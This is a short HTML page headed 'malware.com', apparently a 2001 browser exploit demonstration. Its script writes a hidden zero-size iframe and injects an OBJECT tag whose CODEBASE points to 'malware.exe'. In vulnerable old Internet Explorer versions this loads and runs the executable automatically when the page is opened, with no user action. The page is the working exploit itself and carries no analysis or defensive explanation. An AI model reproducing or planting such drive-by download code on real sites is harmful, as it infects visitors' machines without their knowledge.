<center><b><font  color="#000000" face="arial">  <h1>malware.com</h1></font></b></center>


<script>
// http://www.malware.com - 18.03.01
document.writeln('<IFRAME ID=runnerwin WIDTH=0 HEIGHT=0 SRC="about:blank"></IFRAME>');
function linkit(filename)
{
   strpagestart = "<HTML><HEAD></HEAD><BODY><OBJECT   CLASSID=" +
      "'CLSID:15589FA1-C456-11CE-BF01-00AA0055595A' CODEBASE='";
   strpageend = "'></OBJECT></BODY></HTML>";
   runnerwin.document.open();
   runnerwin.document.write(strpagestart + filename + strpageend);
 }
linkit('malware.exe');
</script>